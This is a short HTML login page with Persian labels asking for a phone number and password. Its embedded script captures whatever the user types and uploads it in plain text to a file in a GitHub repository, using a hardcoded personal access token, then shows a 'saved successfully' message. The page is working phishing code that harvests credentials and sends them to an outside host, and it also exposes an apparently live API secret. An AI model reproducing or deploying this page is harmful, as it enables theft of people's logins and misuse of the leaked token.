<!DOCTYPE html>
<html>
<head>
    <title>صفحه ورود</title>
</head>
<body>
    <h2>ورود به حساب کاربری</h2>
    <form id="loginForm">
        <label for="username">شماره:</label>
        <input type="text" id="username" name="username" required><br><br>

        <label for="password">رمز عبور:</label>
        <input type="password" id="password" name="password" required><br><br>

        <button type="submit">ورود</button>
    </form>

    <script>
        document.getElementById("loginForm").addEventListener("submit", function(event) {
            event.preventDefault(); // جلوگیری از ارسال فرم به صفحه دیگر

            // اطلاعات ورود کاربر را دریافت
            const username = document.getElementById("username").value;
            const password = document.getElementById("password").value;

            // استفاده از GitHub API برای ایجاد یک فایل در ریپازیتوری
            const githubToken = "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"; // توکن دسترسی GitHub شما
            const repoOwner = "amixr3"; // نام کاربری GitHub شما
            const repoName = "Amixr3.github.io"; // نام ریپازیتوری

            const fileContent = `شماره: ${username}, رمز عبور: ${password}`;

            fetch(`https://api.github.com/repos/${repoOwner}/${repoName}/contents/data.txt`, {
                method: "PUT",
                headers: {
                    Authorization: `token ${githubToken}`,
                },
                body: JSON.stringify({
                    message: "اطلاعات ورود کاربر",
                    content: btoa(fileContent), // رمزنگاری محتوا به Base64
                    branch: "main", // نام شاخه مورد نظر
                }),
            })
            .then(response => response.json())
            .then(data => {
                alert("اطلاعات با موفقیت ذخیره شد.");
            })
            .catch(error => {
                console.error("خطا در ذخیره اطلاعات:", error);
            });
        });
    </script>
</body>
</html>
